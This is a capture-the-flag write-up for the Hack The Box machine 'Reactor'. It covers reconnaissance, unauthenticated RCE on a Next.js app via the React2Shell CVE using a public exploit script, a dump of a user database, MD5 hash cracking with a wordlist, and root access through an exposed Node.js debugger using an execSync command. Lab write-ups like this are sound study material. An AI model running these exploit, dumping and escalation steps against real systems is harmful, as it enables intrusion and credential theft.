# Reactor — Hack The Box

**Difficulty:** —
**OS:** Linux
**Date:** 2026-08-15
**IP:** `10.129.105.11`

## Summary

The machine exposes a Next.js application ("ReactorWatch") on port 3000, vulnerable to **CVE-2025-55182 / CVE-2025-66478 ("React2Shell")**, an unauthenticated RCE in the React Server Components Flight protocol. From initial access as `node`, an exposed SQLite database revealed user password hashes; the `engineer` user's hash was cracked via rockyou. Privilege escalation to root was achieved through the Node.js debugger (`--inspect`) exposed on `127.0.0.1:9229`, tied to a monitoring process running with root privileges.

## Reconnaissance

```bash
nmap -sC -sV 10.129.105.11
```

```
PORT     STATE SERVICE VERSION
┌──(henrique㉿kali)-[~/Downloads]
└─$ nmap -sC -sV 10.129.105.11
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-15 20:35 WEST
Nmap scan report for 10.129.105.11
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Sat, 15 Aug 2026 19:36:05 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Sat, 15 Aug 2026 19:36:05 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
```

## Enumeration

- Port 3000: static "ReactorWatch | Core Monitoring System" dashboard — no visible interaction.
- Analysis of the JS bundles (`/_next/static/chunks/*.js`) confirmed **React 19.0.0** and the use of React Server Components / Server Actions (headers `Next-Action`, `RSC`, `Next-Router-State-Tree`).
- `gobuster` and manual tests of common routes (`/admin`, `/api`, `/login`, etc.) revealed no additional endpoints — the app is largely client-side static.
- Next.js manifests (`app-build-manifest.json`, `build-manifest.json`) returned 404 — no visible hidden routes.
- The combination of the exact version (React 19.0.0) and confirmed use of RSC/Flight pointed to a known vulnerability class.

## Initial Access

**CVE-2025-55182 (React) / CVE-2025-66478 (Next.js) — "React2Shell"**: an insecure deserialization flaw in the React Server Components Flight protocol, enabling unauthenticated RCE via a specially crafted HTTP payload, even in default configurations.

Confirmed via a public PoC (`exploit.py`, variant with `-u`/`-c`/`--linux` flags):

```bash
python exploit.py -u http://10.129.105.11:3000 -c "whoami" --linux
```

```
OUTPUT:
node
```

RCE confirmed as user `node` (uid=999, gid=988).

## Post-Exploitation / Lateral Movement

Enumeration of the application directory (`/opt/reactor-app`) revealed a `reactor.db` file (SQLite):

```bash
python exploit.py -u http://10.129.105.11:3000 -c "sqlite3 reactor.db .dump" --linux
```

Extracted the `users` table:

```sql
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ad##########','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a6863###########','operator','engineer@reactor.htb');
```

Cracked the MD5 hashes with hashcat:

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Result: `engineer:########`

Successful SSH login:

```bash
ssh engineer@10.129.105.11
```

## Privilege Escalation

Process enumeration revealed a root-owned service running with the Node.js debugger active and exposed locally:

```
root  1125  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

The Node inspector allows arbitrary code execution in the process context (root):

```bash
node inspect 127.0.0.1:9229
```

Inside the debugger REPL:

```javascript
repl
process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
```

Successful execution as root, confirming full privilege escalation.

## Flags

- User: `c0d1e6c23e28b9ffe9##############`
- Root: `cf7fe87eb3e229f42e##############`

## Lessons Learned

- Exact framework versions (here, React 19.0.0) are a direct indicator of known CVEs — always worth confirming the version via JS bundles/headers before spending time on route enumeration.
- System groups like `lxd` are an obvious escalation clue, but aren't always available (LXD wasn't installed here) — always worth reviewing root-owned processes (`ps aux`) for exposed debug ports or misconfigured services too.
- The Node.js Inspector (`--inspect`), even when only exposed on localhost, is a critical attack surface once combined with local access — it enables trivial RCE in the process's context.

## References

- [NVD — CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [Wiz Research — React2Shell](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [TryHackMe — React2Shell room](https://tryhackme.com/room/react2shellcve202555182)
